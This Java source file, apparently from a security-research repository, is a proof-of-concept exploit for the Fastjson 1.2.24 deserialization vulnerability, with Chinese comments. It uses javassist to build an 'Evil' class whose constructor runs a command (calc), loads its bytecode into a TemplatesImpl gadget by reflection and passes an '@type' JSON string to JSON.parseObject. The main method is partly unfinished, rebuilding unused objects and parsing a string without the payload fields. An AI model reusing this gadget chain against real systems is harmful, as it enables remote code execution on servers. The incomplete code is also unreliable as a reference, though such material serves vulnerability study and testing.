package com.r17a.fastjson;

//https://drops.blbana.cc/2020/04/16/Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90/#%E7%89%88%E6%9C%AC1-2-25

import com.r17a.annotation.Dependencies;
import com.alibaba.fastjson.JSON;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.lang.reflect.Field;

@Dependencies({"com.alibaba:fastjson:1.2.24"})
//TODO 修改pom.xml中的依赖版本
// <dependency>
// <groupId>com.alibaba</groupId>
// <artifactId>fastjson</artifactId>
// <version>1.2.24</version>
// </dependency>

public class Fastjson_1_2_24 {
    public static void main(String[] args) throws Exception {
        // 反序列化一个fastjson.test.T1对象
        // 1.2.25及以后版本加入了checkAutoType()函数的校验，
        TemplatesImpl templatesImpl = getEvilTemplatesImpl();
        String s = JSON.toJSONString(templatesImpl);
        System.out.println(s);
        ClassPool pool = ClassPool.getDefault();//ClassPool对象是一个表示class文件的CtClass对象的容器
        CtClass cc = pool.makeClass("Evil");//创建Evil类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//设置Evil类的父类为AbstractTranslet
        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//创建无参构造函数
        cons.setBody("{ Runtime.getRuntime().exec(\"calc\"); }");//设置无参构造函数体
        cc.addConstructor(cons);
        byte[] byteCode = cc.toBytecode();//toBytecode得到Evil类的字节码
        byte[][] targetByteCode = new byte[][]{byteCode};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        String evil = "{\"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"}";
        Object object = JSON.parseObject(evil);
//        System.out.println(object);
    }

    /**
     * 封装了之前对恶意TemplatesImpl类的构造
     */
    public static TemplatesImpl getEvilTemplatesImpl() throws Exception {
        ClassPool pool = ClassPool.getDefault();//ClassPool对象是一个表示class文件的CtClass对象的容器
        CtClass cc = pool.makeClass("Evil");//创建Evil类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//设置Evil类的父类为AbstractTranslet
        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//创建无参构造函数
        cons.setBody("{ Runtime.getRuntime().exec(\"calc\"); }");//设置无参构造函数体
        cc.addConstructor(cons);
        byte[] byteCode = cc.toBytecode();//toBytecode得到Evil类的字节码
        byte[][] targetByteCode = new byte[][]{byteCode};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCode);
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_name", "xx");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }

    //通过反射为obj的属性赋值
    private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

}




